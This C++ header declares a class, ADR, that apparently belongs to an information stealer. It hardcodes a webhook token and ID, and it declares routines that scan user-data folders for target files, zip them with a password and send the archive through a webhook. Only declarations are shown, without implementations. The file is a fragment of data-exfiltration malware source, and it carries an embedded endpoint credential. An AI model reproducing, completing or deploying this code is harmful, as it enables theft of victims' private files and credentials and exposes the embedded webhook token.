#pragma once
#include "stdafx.h"

#include "utils.h"
#include "webhook/webhook.h"
#include "userinfo/userinfo.h"
#include "ffs/linear.h"
#include "zip/zip.h"

#define WEBHOOK_TOKEN "bt1e__roeSBzyaROJ1YJhGQdtrJJ5IFEX9pgEStCBOYtCdLttyl2-fqWR31pv9PQkxfv"
#define WEBHOOK_ID 1134572478090448896

#define WEBHOOK_MAX_PACK_SIZE 20
#define WEBHOOK_TARGET_PACK_SIZE 10
#define O_2_MO 1000000

class ADR {
public:
    ADR();
    ~ADR();
    int start();
private:
    bool createZipPack();
    bool processUserDataFolder(const std::string&);

    bool sendPack();

    std::vector<std::string> getUserDataFiles(const std::string& path);
    void searchTargets(const std::vector<std::string>&, const std::string&);

    std::ofstream config;
    std::string configPath;

    std::string zipOutPath;
    std::string zipOutName;
    std::string zipPassword;

    HZIP hz;
    Webhook hook;
    uint32_t errors;

    std::vector<std::string> results;
};

